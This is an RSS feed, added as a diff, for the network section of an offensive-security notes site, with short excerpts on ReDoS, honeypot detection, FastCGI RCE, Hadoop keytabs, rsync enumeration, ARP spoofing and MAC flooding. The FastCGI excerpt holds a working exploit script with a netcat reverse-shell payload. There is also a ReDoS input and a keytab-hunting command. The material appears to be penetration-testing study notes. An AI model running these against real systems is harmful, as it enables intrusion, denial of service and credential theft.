@@ -1,0 +1,103 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Network on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/network/</link>
+    <description>Recent content in Network on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 15:17:24 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/network/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ReDoS (Regular Expression Denial of Service)</title>
+      <link>https://documentnation.github.io/docs/hdks/network/redos/</link>
+      <pubDate>Thu, 12 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/redos/</guid>
+      <description>Evil (Vulnerable) Regex link (a&amp;#43;)&amp;#43; ([a-zA-Z]&amp;#43;)* (a|aa)&amp;#43; (a|a?)&amp;#43; (.*a){x} for x \&amp;gt; 10 ^(([a-z])&amp;#43;.)&amp;#43;[A-Z]([a-z])&amp;#43;$ &amp;lt;!-- https://regexlib.com/REDetails.aspx?regexp_id=1757&amp;amp;AspxAutoDetectCookieSupport=1 --&amp;gt; /^([a-zA-Z0-9])(([\-.]|[_]&amp;#43;)?([a-zA-Z0-9]&amp;#43;))*(@){1}[a-z0-9]&amp;#43;[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$/ Malicious Input linkIf a target website validates user input with the above vulnerable Regex, we may be able to compromise the target system by the following malicious input:&#xA;aaaaaaaaaaaaaaaaaaaaaaaa! </description>
+    </item>
+    <item>
+      <title>Honeypots</title>
+      <link>https://documentnation.github.io/docs/hdks/network/honeypots/</link>
+      <pubDate>Sun, 06 Aug 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/honeypots/</guid>
+      <description>Detecting Honeypot linkWhen entered target system, then if we felt something is wrong. For example,&#xA;Cannot execute common OS commands e.g. ls, cat, etc. There are few files under /home/&amp;lt;user&amp;gt; unnaturally. There are few users or uncommon users exist in /etc/passwd unnaturally. Found either cowrie-env, cowrie.cfg, tpot.yml, dionaea.cfg in system. We may be able to suspect the system is a honeypot.&#xA;Cowrie linkCowrie is an SSH/Telnet honeypot.&#xA;Directories &amp;amp; Files link etc/cowrie.</description>
+    </item>
+    <item>
+      <title>gRPC Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/network/grpc-pentesting/</link>
+      <pubDate>Sun, 28 May 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/grpc-pentesting/</guid>
+      <description>Connect with grpcui linkgrpcui is an interactive web UI for gRPC.&#xA;If you don’t have grpcui, you need to install it.&#xA;go install github.com/fullstorydev/grpcui/cmd/grpcui@latest Then we can interact with gRPC.&#xA;grpcui -plaintext example.com:9019 </description>
+    </item>
+    <item>
+      <title>FastCGI Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/network/fastcgi-pentesting/</link>
+      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/fastcgi-pentesting/</guid>
+      <description>Investigation linkIf the PHP-FPM (FastCGI Process Manager) is running on the target system, we might be able to execute arbitrary command.&#xA;ps aux | cat php-fpm: pool username Remote Code Execution linkReference: https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi&#xA;We need to create an arbitrary PHP file somewhere. For instance,&#xA;touch /dev/shm/index.php Then create a shell script named &amp;ldquo;exploit.sh&amp;rdquo;.&#xA;#!/bin/bash PAYLOAD=&amp;#34;&amp;lt;?php echo &amp;#39;&amp;lt;!--&amp;#39;; system(&amp;#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 4444 &amp;gt;/tmp/f&amp;#39;); echo &amp;#39;--&amp;gt;&amp;#39;;&amp;#34; FILENAMES=&amp;#34;/dev/shm/index.php&amp;#34; # Exisiting file path HOST=$1 B64=$(echo &amp;#34;$PAYLOAD&amp;#34;|base64) for FN in $FILENAMES; do OUTPUT=$(mktemp) env -i \ PHP_VALUE=&amp;#34;allow_url_include=1&amp;#34;$&amp;#39;\n&amp;#39;&amp;#34;allow_url_fopen=1&amp;#34;$&amp;#39;\n&amp;#39;&amp;#34;auto_prepend_file=&amp;#39;data://text/plain\;base64,$B64&amp;#39;&amp;#34; \ SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \ cgi-fcgi -bind -connect $HOST:9000 &amp;amp;&amp;gt; $OUTPUT cat $OUTPUT done Now execute the shell script.</description>
+    </item>
+    <item>
+      <title>Apache Hadoop Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/network/apache-hadoop-pentesting/</link>
+      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/apache-hadoop-pentesting/</guid>
+      <description>Authenticate using Keytab linkKyetab files are used to authenticate to the KDC (key distribution center) on Kerberos authentication. To find them, execute the following command in target system.&#xA;find / -type f -name *.keytab 2&amp;gt;/dev/null After finding them, we can use them to gather information or authenticate.&#xA;# Gather information from a keytab # -k: Speicifed a keytab file klist -k /path/to/example.keytab # Authenticate to Kerberos server and request a ticket.</description>
+    </item>
+    <item>
+      <title>Rsync Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/network/rsync-pentesting/</link>
+      <pubDate>Mon, 06 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/rsync-pentesting/</guid>
+      <description>Enumeration link nmap --script rsync-list-modules -p 873 &amp;lt;target-ip&amp;gt; nmap --script rsync-brute --script-args &amp;#39;rsync-brute.module=www&amp;#39; &amp;lt;target-ip&amp;gt; # Banner grabbing and list shared folders # We can execute commands (modules) that we found, after entering &amp;#39;@RSYNCD: &amp;lt;version&amp;gt;&amp;#39;. nc -nv &amp;lt;target-ip&amp;gt; 873 @RSYNCD: 31.0 #list raidroot Conf @RSYNCD: EXIT # List sync data using rsync rsync &amp;lt;target-ip&amp;gt;:: rsync -av --list-only rsync://&amp;lt;target-ip&amp;gt; # List sync data using Metasploit msf&amp;gt; use auxiliary/scanner/rsync/modules_list When we found the shared folder, check if we can connect without authentication.</description>
+    </item>
+    <item>
+      <title>Network Traffic Analysis (NTA)</title>
+      <link>https://documentnation.github.io/docs/hdks/network/network-traffic-analysis/</link>
+      <pubDate>Sun, 29 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/network-traffic-analysis/</guid>
+      <description>Packet Analysis link wireshark example.pcap # Tcpdump sudo tcpdump -i eth0 icmp # output pcap file sudo tcpdump -i eth0 icmp -w /tmp/tcpdump.pcap Brim linkBrim is an application to search and analyze super-structured data.&#xA;brim sample.pcap Filters&#xA;_path==&amp;#34;http&amp;#34; &amp;#34;example.com&amp;#34; id.resp_p==80 | cut ts, host, id.resp_p, uri | sort ts # Find UserAgent in HTTP requests user_agent | cut _path,id.orig_h,id.resp_h,method,host,user_agent Snort linkSnort is a network intrusion detection system (NIDS) and intrusion prevention system (NIPS).</description>
+    </item>
+    <item>
+      <title>EthernetIP Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/network/eternetip-pentesting/</link>
+      <pubDate>Fri, 27 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/eternetip-pentesting/</guid>
+      <description>Enumeration link nmap --script enip-info -p 44818 &amp;lt;target-ip&amp;gt; </description>
+    </item>
+    <item>
+      <title>Firewall</title>
+      <link>https://documentnation.github.io/docs/hdks/network/firewall/</link>
+      <pubDate>Sun, 11 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/firewall/</guid>
+      <description>Status link ufw status ufw status verbose Enable/Disable the Firewall link ufw enable ufw disable Set Default Policies link # Allow all ufw default ALLOW # Deny all ufw default DENY Rules link Allow&#xA;ufw allow 22 ufw allow 22/tcp ufw allow 80 ufw allow 80/tcp # Allow the given ip address access to port 22 for all protocols ufw allow from &amp;lt;ip&amp;gt; to any port 22 Deny&#xA;ufw deny 22 ufw deny 22/tcp ufw deny 80 ufw deny 80/tcp </description>
+    </item>
+    <item>
+      <title>Tor</title>
+      <link>https://documentnation.github.io/docs/hdks/network/tor/</link>
+      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/tor/</guid>
+      <description>Install Tor link sudo apt install tor Start/Restart/Stop Tor Service link # Start sudo service tor start # Restart sudo service tor restart # Stop sudo service tor stop # Status sudo service tor statur Proxychains linkProxychains forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy.&#xA;configuration&#xA;vim /etc/proxychains.conf # ----------------------------------------------------- # If performing nmap for port scan through proxychains, comment out the following.</description>
+    </item>
+    <item>
+      <title>ARP (Address Resolution Protocol) Spoofing</title>
+      <link>https://documentnation.github.io/docs/hdks/network/arp-spoofing/</link>
+      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/arp-spoofing/</guid>
+      <description>Basic Flow link Check Interface and Gateway IP Address&#xA;# Interfaces ip addr # Default gateway ip route list Scan the Network to Find Target IP&#xA;nmap -sP &amp;lt;gateway-ip&amp;gt;/24 nmap -sP &amp;lt;gateway-ip&amp;gt;/16 Enable IP Forwarding&#xA;# Allow all forwading in the LAN # -A: append rules # -i: interface # -j: jump iptables -A FORWARD -i eth0 -j ACCEPT Find MAC Address link cat /sys/class/net/eth0/address cat /sys/class/net/enp0s3/address cat /sys/class/net/tun0/address </description>
+    </item>
+    <item>
+      <title>MAC Flooding Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/network/mac-flooding-attack/</link>
+      <pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/mac-flooding-attack/</guid>
+      <description>Attack Flow link Open Two SSH Sessions&#xA;Start the SSH session 1 in terminal 1.&#xA;ssh victim@&amp;lt;target-ip&amp;gt; Start the SSH session 2 in terminal 2.&#xA;Flood the Switch and Capturing the Traffic&#xA;In the session 1, start tcpdump and keep it running.&#xA;tcpdump -A -i eth1 -w /tmp/tcpdump.pcap In the session 2, start flooding the switch (here &amp;ldquo;eth1&amp;rdquo; interface).&#xA;macof -i eth1 After about 30 seconds, stop macof and tcpdump.</description>
+    </item>
+    <item>
+      <title>Networking</title>
+      <link>https://documentnation.github.io/docs/hdks/network/networking/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/networking/</guid>
+      <description>Network Connection linkStatus link netstat # -t: tcp, -u: udp, -l: listen, -p: programs, -n: don&amp;#39;t resolve names netstat -lnptu # -r: route netstat -rn Connectivity of Hosts link ping &amp;lt;target-ip&amp;gt; # Stop after 5 times ping -c 5 &amp;lt;target-ip&amp;gt; # No DNS resolution ping -n 3 &amp;lt;target-ip&amp;gt; Trace Route Path Between Two Nodes link traceroute &amp;lt;target-ip&amp;gt; Investigate Packets/Traffic link ICMP&#xA;Check the status of network connections between nodes.&#xA;Start Tcpdump</description>
+    </item>
+  </channel>
+</rss>
